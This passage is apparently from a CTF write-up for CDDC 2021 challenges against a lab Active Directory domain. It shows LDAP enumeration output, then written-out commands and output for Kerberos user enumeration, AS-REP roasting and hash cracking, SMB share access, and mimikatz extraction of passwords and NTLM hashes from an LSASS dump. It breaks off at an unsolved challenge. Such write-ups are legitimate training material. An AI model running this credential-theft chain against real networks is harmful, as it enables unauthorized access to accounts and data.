    |       supportedControl: 1.2.840.113556.1.4.2064
    |       supportedControl: 1.2.840.113556.1.4.2065
    |       supportedControl: 1.2.840.113556.1.4.2066
    |       supportedControl: 1.2.840.113556.1.4.2090
    |       supportedControl: 1.2.840.113556.1.4.2205
    |       supportedControl: 1.2.840.113556.1.4.2204
    |       supportedControl: 1.2.840.113556.1.4.2206
    |       supportedControl: 1.2.840.113556.1.4.2211
    |       supportedControl: 1.2.840.113556.1.4.2239
    |       supportedControl: 1.2.840.113556.1.4.2255
    |       supportedControl: 1.2.840.113556.1.4.2256
    |       supportedControl: 1.2.840.113556.1.4.2309
    |       supportedLDAPVersion: 3
    |       supportedLDAPVersion: 2
    |       supportedLDAPPolicies: MaxPoolThreads
    |       supportedLDAPPolicies: MaxPercentDirSyncRequests
    |       supportedLDAPPolicies: MaxDatagramRecv
    |       supportedLDAPPolicies: MaxReceiveBuffer
    |       supportedLDAPPolicies: InitRecvTimeout
    |       supportedLDAPPolicies: MaxConnections
    |       supportedLDAPPolicies: MaxConnIdleTime
    |       supportedLDAPPolicies: MaxPageSize
    |       supportedLDAPPolicies: MaxBatchReturnMessages
    |       supportedLDAPPolicies: MaxQueryDuration
    |       supportedLDAPPolicies: MaxDirSyncDuration
    |       supportedLDAPPolicies: MaxTempTableSize
    |       supportedLDAPPolicies: MaxResultSetSize
    |       supportedLDAPPolicies: MinResultSets
    |       supportedLDAPPolicies: MaxResultSetsPerConn
    |       supportedLDAPPolicies: MaxNotificationPerConn
    |       supportedLDAPPolicies: MaxValRange
    |       supportedLDAPPolicies: MaxValRangeTransitive
    |       supportedLDAPPolicies: ThreadMemoryLimit
    |       supportedLDAPPolicies: SystemMemoryLimitPercent
    |       highestCommittedUSN: 585355
    |       supportedSASLMechanisms: GSSAPI
    |       supportedSASLMechanisms: GSS-SPNEGO
    |       supportedSASLMechanisms: EXTERNAL
    |       supportedSASLMechanisms: DIGEST-MD5
    |       dnsHostName: GDC-DC-S.gdc.local
    |       ldapServiceName: gdc.local:gdc-dc-s$@GDC.LOCAL
    |       serverName: CN=GDC-DC-S,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=gdc,DC=local
    |       supportedCapabilities: 1.2.840.113556.1.4.800
    |       supportedCapabilities: 1.2.840.113556.1.4.1670
    |       supportedCapabilities: 1.2.840.113556.1.4.1791
    |       supportedCapabilities: 1.2.840.113556.1.4.1935
    |       supportedCapabilities: 1.2.840.113556.1.4.2080
    |       supportedCapabilities: 1.2.840.113556.1.4.2237
    |       isSynchronized: TRUE
    |       isGlobalCatalogReady: TRUE
    |       domainFunctionality: 7
    |       forestFunctionality: 7
    |_      domainControllerFunctionality: 7
    | ldap-search: 
    |   Context: DC=gdc,DC=local
    |     dn: DC=gdc,DC=local
    |     dn: CN=Configuration,DC=gdc,DC=local
    |     dn: CN=Schema,CN=Configuration,DC=gdc,DC=local
    |     dn: OU=Management,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: organizationalUnit
    |         ou: Management
    |         distinguishedName: OU=Management,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:49:38 UTC
    |         whenChanged: 2021/06/18 22:49:49 UTC
    |         uSNCreated: 12803
    |         uSNChanged: 12808
    |         name: Management
    |         objectGUID: 224cd37a-c189-b244-a52e-f1c7fc9d5a8f
    |         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 2021/06/18 22:49:49 UTC
    |         dSCorePropagationData: 2021/06/18 22:49:38 UTC
    |         dSCorePropagationData: 2021/06/18 22:49:38 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: organizationalUnit
    |         ou: Users
    |         distinguishedName: OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:49:49 UTC
    |         whenChanged: 2021/06/18 22:49:49 UTC
    |         uSNCreated: 12806
    |         uSNChanged: 12807
    |         name: Users
    |         objectGUID: d7a7c86e-9a4a-b049-b5bb-fd395052cda
    |         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 2021/06/18 22:49:49 UTC
    |         dSCorePropagationData: 2021/06/18 22:49:49 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: OU=Finance,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: organizationalUnit
    |         ou: Finance
    |         distinguishedName: OU=Finance,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:50:05 UTC
    |         whenChanged: 2021/06/18 22:50:14 UTC
    |         uSNCreated: 12809
    |         uSNChanged: 12813
    |         name: Finance
    |         objectGUID: 422a75eb-379a-d445-845-6e5868f7c3c1
    |         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 2021/06/18 22:50:14 UTC
    |         dSCorePropagationData: 2021/06/18 22:50:05 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: OU=Users,OU=Finance,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: organizationalUnit
    |         ou: Users
    |         distinguishedName: OU=Users,OU=Finance,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:50:14 UTC
    |         whenChanged: 2021/06/18 22:50:14 UTC
    |         uSNCreated: 12811
    |         uSNChanged: 12812
    |         name: Users
    |         objectGUID: a0ad453d-ad5c-624d-bec8-ba825dbf6085
    |         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 2021/06/18 22:50:14 UTC
    |         dSCorePropagationData: 2021/06/18 22:50:14 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: OU=Sales,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: organizationalUnit
    |         ou: Sales
    |         distinguishedName: OU=Sales,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:50:28 UTC
    |         whenChanged: 2021/06/18 22:50:37 UTC
    |         uSNCreated: 12814
    |         uSNChanged: 12818
    |         name: Sales
    |         objectGUID: 978b3487-98ea-b842-a97f-c37430e6a48
    |         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 2021/06/18 22:50:37 UTC
    |         dSCorePropagationData: 2021/06/18 22:50:28 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: OU=Users,OU=Sales,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: organizationalUnit
    |         ou: Users
    |         distinguishedName: OU=Users,OU=Sales,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:50:37 UTC
    |         whenChanged: 2021/06/18 22:50:37 UTC
    |         uSNCreated: 12816
    |         uSNChanged: 12817
    |         name: Users
    |         objectGUID: 31b708b-1b5e-2743-aff9-322e10d8769c
    |         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 2021/06/18 22:50:37 UTC
    |         dSCorePropagationData: 2021/06/18 22:50:37 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: OU=Information Technology,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: organizationalUnit
    |         ou: Information Technology
    |         distinguishedName: OU=Information Technology,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:51:01 UTC
    |         whenChanged: 2021/06/18 22:51:17 UTC
    |         uSNCreated: 12819
    |         uSNChanged: 12823
    |         name: Information Technology
    |         objectGUID: 5b97d498-bd3-dd4e-8c24-4c4d8074e474
    |         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 2021/06/18 22:51:17 UTC
    |         dSCorePropagationData: 2021/06/18 22:51:01 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: OU=Users,OU=Information Technology,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: organizationalUnit
    |         ou: Users
    |         distinguishedName: OU=Users,OU=Information Technology,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:51:17 UTC
    |         whenChanged: 2021/06/18 22:51:17 UTC
    |         uSNCreated: 12821
    |         uSNChanged: 12822
    |         name: Users
    |         objectGUID: d166b49d-c9c3-8a45-9b4c-7d1fa1bdcb
    |         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 2021/06/18 22:51:17 UTC
    |         dSCorePropagationData: 2021/06/18 22:51:17 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=Catherine Weaver,OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: Catherine Weaver
    |         sn: Weaver
    |         description: CEO at Global Domination Corporation
    |         givenName: Catherine
    |         distinguishedName: CN=Catherine Weaver,OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/18 22:53:45 UTC
    |         displayName: Weaver, Catherine
    |         uSNCreated: 12828
    |         memberOf: CN=Management,OU=Groups,OU=GDC,DC=gdc,DC=local
    |         uSNChanged: 12832
    |         name: Catherine Weaver
    |         objectGUID: 1482068-2412-5d42-846d-73844ba64b6
    |         userAccountControl: 512
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1112
    |         sAMAccountName: catherine.w
    |         sAMAccountType: 805306368
    |         userPrincipalName: catherine.w@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=Emily Lopez,OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: Emily Lopez
    |         sn: Lopez
    |         description: Vice President at Global Domination Corporation. CDDC21{GDC2!_1nte4NaL}
    |         givenName: Emily
    |         distinguishedName: CN=Emily Lopez,OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/19 00:04:48 UTC
    |         displayName: Lopez, Emily
    |         uSNCreated: 12834
    |         memberOf: CN=Management,OU=Groups,OU=GDC,DC=gdc,DC=local
    |         uSNChanged: 13029
    |         name: Emily Lopez
    |         objectGUID: 304a88d6-c939-f04c-b047-5439ada2f3c
    |         userAccountControl: 512
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1113
    |         sAMAccountName: emily.l
    |         sAMAccountType: 805306368
    |         userPrincipalName: emily.l@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=Miles Dyson,OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: Miles Dyson
    |         sn: Dyson
    |         description: Director of Special Projects at Global Domination Corporation
    |         givenName: Miles
    |         distinguishedName: CN=Miles Dyson,OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/18 22:53:45 UTC
    |         displayName: Dyson, Miles
    |         uSNCreated: 12840
    |         memberOf: CN=Management,OU=Groups,OU=GDC,DC=gdc,DC=local
    |         uSNChanged: 12844
    |         name: Miles Dyson
    |         objectGUID: 5c676a5-6c25-b747-a824-4c8914d6dd19
    |         userAccountControl: 512
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1114
    |         sAMAccountName: miles.d
    |         sAMAccountType: 805306368
    |         userPrincipalName: miles.d@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=Kimberley Duncan,OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: Kimberley Duncan
    |         sn: Duncan
    |         description: Director of Community Relations and Media Control at Global Domination Corporation
    |         givenName: Kimberley
    |         distinguishedName: CN=Kimberley Duncan,OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/18 22:53:45 UTC
    |         displayName: Duncan, Kimberley
    |         uSNCreated: 12846
    |         memberOf: CN=Management,OU=Groups,OU=GDC,DC=gdc,DC=local
    |         uSNChanged: 12850
    |         name: Kimberley Duncan
    |         objectGUID: 26aba7e1-d17-5c48-afce-f0a137d3216f
    |         userAccountControl: 512
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1115
    |         sAMAccountName: kimberley.d
    |         sAMAccountType: 805306368
    |         userPrincipalName: kimberley.d@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=William Russell,OU=Users,OU=Finance,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: William Russell
    |         sn: Russell
    |         description: CFO at Global Domination Corporation
    |         givenName: William
    |         distinguishedName: CN=William Russell,OU=Users,OU=Finance,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/18 22:53:45 UTC
    |         displayName: Russell, William
    |         uSNCreated: 12852
    |         uSNChanged: 12856
    |         name: William Russell
    |         objectGUID: 4d88a9f1-9bd7-fd44-b6ad-17a0c18984ca
    |         userAccountControl: 512
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1116
    |         sAMAccountName: william.r
    |         sAMAccountType: 805306368
    |         userPrincipalName: william.r@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=Mia Parker,OU=Users,OU=Finance,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: Mia Parker
    |         sn: Parker
    |         description: Finance Department
    |         givenName: Mia
    |         distinguishedName: CN=Mia Parker,OU=Users,OU=Finance,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/18 22:53:45 UTC
    |         displayName: Parker, Mia
    |         uSNCreated: 12858
    |         uSNChanged: 12862
    |         name: Mia Parker
    |         objectGUID: 9f644f34-266d-ea4f-85c2-c3f7571b198
    |         userAccountControl: 512
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1117
    |         sAMAccountName: mia.p
    |         sAMAccountType: 805306368
    |         userPrincipalName: mia.p@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=James Reed,OU=Users,OU=Finance,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: James Reed
    |         sn: Reed
    |         description: Finance Department
    |         givenName: James
    |         distinguishedName: CN=James Reed,OU=Users,OU=Finance,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/18 22:53:45 UTC
    |         displayName: Reed, James
    |         uSNCreated: 12864
    |         uSNChanged: 12868
    |         name: James Reed
    |         objectGUID: ae74967b-4ceb-754e-986f-b429bf7b103c
    |         userAccountControl: 512
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1118
    |         sAMAccountName: james.r
    |         sAMAccountType: 805306368
    |         userPrincipalName: james.r@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=Leo Garcia,OU=Users,OU=Sales,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: Leo Garcia
    |         sn: Garcia
    |         description: Sales
    |         givenName: Leo
    |         distinguishedName: CN=Leo Garcia,OU=Users,OU=Sales,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/18 22:53:45 UTC
    |         displayName: Garcia, Leo
    |         uSNCreated: 12870
    |         memberOf: CN=Sales,OU=Groups,OU=GDC,DC=gdc,DC=local
    |         uSNChanged: 12874
    |         name: Leo Garcia
    |         objectGUID: 72a63fbc-eb49-1c43-a560-a817d2326d28
    |         userAccountControl: 512
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1119
    |         sAMAccountName: leo.g
    |         sAMAccountType: 805306368
    |         userPrincipalName: leo.g@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=Adrian Collins,OU=Users,OU=Sales,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: Adrian Collins
    |         sn: Collins
    |         description: Sales
    |         givenName: Adrian
    |         distinguishedName: CN=Adrian Collins,OU=Users,OU=Sales,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/18 22:53:45 UTC
    |         displayName: Collins, Adrian
    |         uSNCreated: 12876
    |         memberOf: CN=Sales,OU=Groups,OU=GDC,DC=gdc,DC=local
    |         uSNChanged: 12880
    |         name: Adrian Collins
    |         objectGUID: 128233a5-a682-ba4d-9520-3fa535d7561
    |         userAccountControl: 512
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1120
    |         sAMAccountName: adrian.c
    |         sAMAccountType: 805306368
    |         userPrincipalName: adrian.c@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    | 
    | 
    |_Result limited to 20 objects (see ldap.maxobjects)
    3269/tcp open  tcpwrapped
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port53-TCP:V=7.80%I=7%D=6/24%Time=60D489C8%P=x86_64-pc-linux-gnu%r(DNSV
    SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
    SF:x04bind\0\0\x10\0\x03");
    Service Info: Host: GDC-DC-S; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Thu Jun 24 21:36:11 2021 -- 1 IP address (1 host up) scanned in 147.29 seconds
    ```
    

![](/static/content/cddc-2021/Untitled%2022.png)

```bash
CDDC21{GDC2!_1nte4NaL}
```

## 2. Get a Ticket

300 Points

We must find a way to access the shared folders configured on this server. I don’t see anyway, but maybe you can figure it out…

Hint #1: Create a user list of the AD users and check if they have a special property that can give you a ticket.

[ASREPRoast](https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast)

[TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)

[Abusing Kerberos Using Impacket](https://www.hackingarticles.in/abusing-kerberos-using-impacket/)

```bash
python3 kerbrute.py -users users.txt -domain gdc.local -dc-ip 18.136.74.102 -t 10 -outputfile results.txt
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Valid user => catherine.w
[*] Valid user => kimberley.d
[*] Valid user => william.r
[*] Valid user => adrian.c
[*] Valid user => james.r
[*] Valid user => emily.l
[*] Valid user => miles.d
[*] Valid user => mia.p
[*] Valid user => leo.g
[*] Valid user => adam.l
[*] Valid user => liam.a [NOT PREAUTH]
[*] No passwords were discovered :'(
```

```bash
python3 GetNPUsers.py -dc-ip 18.136.74.102 gdc.local/ -usersfile ../../kerbrute/users.txt -format john -outputfile hashes.txt
Impacket v0.9.24.dev1+20210618.54810.11f43043 - Copyright 2021 SecureAuth Corporation

[-] User catherine.w doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User emily.l doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User miles.d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User kimberley.d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User william.r doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mia.p doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User james.r doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User leo.g doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User adrian.c doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User adam.l doesn't have UF_DONT_REQUIRE_PREAUTH set

cat hashes.txt 
$krb5asrep$liam.a@GDC.LOCAL:c92139287fbc38cf2c4fc5c748199603$5af1d6250c0bc4565ff4a7d2e88e1ae63ccba7543456d5dc517e18924fa6e7080b053b79079bb5cf7ae6722429303acbf0aff7af417b72fa9bd50d9962a86545929fcd1c8d9cfc022347bb905ee694e9f66605746b2017d1bb491922f5ad283cf05433cf0f6cdaf7346eecd77f95d56a9285b89d34404c60cbdfef369b35bd320e6de0484a228a7ffa7100e223ff3a3bce904043dd446b198a965840b438d2125514eb0029a272876411feacf3832943bb1fbdbddee18b0e03b707a9f8fbb2889aa553606f91b31d047c4dccdd4f95a7997dcc6357f7423105d8da86ae2c4697dace336bc274
```

```bash
/usr/sbin/john --wordlist=../../rockyou.txt hashes.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
p@ssw0rd         ($krb5asrep$liam.a@GDC.LOCAL)
1g 0:00:00:00 DONE (2021-06-25 12:17) 3.448g/s 38841p/s 38841c/s 38841C/s bimbim..miamor1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

![Using the username:password of liam.a:p@ssw0rd, we can list the shares Liam has access to](/static/content/cddc-2021/Untitled%2023.png)

Using the username:password of liam.a:p@ssw0rd, we can list the shares Liam has access to

![We can then login and pull flag.txt through smbclient](/static/content/cddc-2021/Untitled%2024.png)

We can then login and pull flag.txt through smbclient

```bash
python3 kerbrute.py -users users.txt -password p@ssw0rd -domain gdc.local -dc-ip 18.136.74.102 -t 10 -outputfile results.txt
Impacket v0.9.24.dev1+20210618.54810.11f43043 - Copyright 2021 SecureAuth Corporation
[*] Stupendous => liam.a:p@ssw0rd
[*] Saved TGT in liam.a.ccache
[*] Saved discovered passwords in results.txt

smbclient -U 'liam.a%p@ssw0rd' -L //18.136.74.102

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backup          Disk      
        C$              Disk      Default share
        Forensics       Disk      
        IPC$            IPC       Remote IPC
        Mission2 Flag   Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

smbclient -U 'liam.a%p@ssw0rd' '//18.136.74.102/Mission2 Flag'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun 19 08:28:52 2021
  ..                                  D        0  Sat Jun 19 08:28:52 2021
  flag.txt                            A       20  Sat Jun 19 08:29:28 2021

                13106687 blocks of size 4096. 6957383 blocks available
smb: \> get flag.txt
getting file \flag.txt of size 20 as flag.txt (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)

cat flag.txt
CDDC21{4S_REP_R0A$T}
```

## 3. Old Memories

300 Points

The file you have found in the shared folder looks like a memory dump that may contain user passwords. You need these passwords for your next mission.

Hint #1: You can extract passwords from the Lsass memory dump with a very popular tool.

```bash
smbclient -U 'liam.a%p@ssw0rd' //18.136.74.102/Forensics
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun 19 08:48:46 2021
  ..                                  D        0  Sat Jun 19 08:48:46 2021
  lsass.zip                          Ao 16752544  Wed Jun 16 00:39:29 2021

                13106687 blocks of size 4096. 6957382 blocks available
smb: \> get lsass.zip
getting file \lsass.zip of size 16752544 as lsass.zip (43510.4 KiloBytes/sec) (average 43510.4 KiloBytes/sec)
```

[lsass.zip](/static/content/cddc-2021/lsass.zip)

[Some ways to dump LSASS.exe](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf)

```bash
C:\Users\iphantasmic\Desktop\mimikatz_trunk\x64>mimikatz "sekurlsa::minidump lsass.DMP"

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun 22 2021 22:01:20
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # sekurlsa::minidump lsass.DMP
Switch to MINIDUMP : 'lsass.DMP'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.DMP' file for minidump...

Authentication Id : 0 ; 920378 (00000000:000e0b3a)
Session           : Interactive from 2
User Name         : Flag
Domain            : DESKTOP-2QFHHML
Logon Server      : DESKTOP-2QFHHML
Logon Time        : 10/6/2021 2:51:50 pm
SID               : S-1-5-21-2198713953-2006436724-2838398043-1002
        msv :
         [00000005] Primary
         * Username : Flag
         * Domain   : DESKTOP-2QFHHML
         * NTLM     : 596c4994f88d93d0718bdea487092f11
         * SHA1     : 45b9d6c67c871a7c763e3a062c8e0684415e6834
        tspkg :
        wdigest :
         * Username : Flag
         * Domain   : DESKTOP-2QFHHML
         * Password : CDDC21{lsa$$_DUMP_password}
        kerberos :
         * Username : Flag
         * Domain   : DESKTOP-2QFHHML
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 195020 (00000000:0002f9cc)
Session           : Interactive from 1
User Name         : John
Domain            : DESKTOP-2QFHHML
Logon Server      : DESKTOP-2QFHHML
Logon Time        : 10/6/2021 2:44:43 pm
SID               : S-1-5-21-2198713953-2006436724-2838398043-1001
        msv :
         [00000005] Primary
         * Username : John
         * Domain   : DESKTOP-2QFHHML
         * NTLM     : 53bb900f229aa32d546f54523a96de67
         * SHA1     : 1075eeefce15aa2008f2e0594babccc09cdf5d4b
        tspkg :
        wdigest :
         * Username : John
         * Domain   : DESKTOP-2QFHHML
         * Password : #johnIStheBEST!
        kerberos :
         * Username : John
         * Domain   : DESKTOP-2QFHHML
         * Password : (null)
        ssp :
        credman :
```

![](/static/content/cddc-2021/Untitled%2025.png)

```bash
CDDC21{lsa$$_DUMP_password}
```

## ~~4. Alternative Way~~ (unsolved)

400 Points

You’re doing great! We almost there, but we need to find a way to take control of this server. What about the backup folder?

```bash
smbclient -U 'John%#johnIStheBEST!' //18.136.74.102/Backup
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun 19 09:05:35 2021
  ..                                  D        0  Sat Jun 19 09:05:35 2021
  creds.txt                           A        0  Sat Jun 19 09:18:46 2021

                13106687 blocks of size 4096. 6957330 blocks available
```

```bash
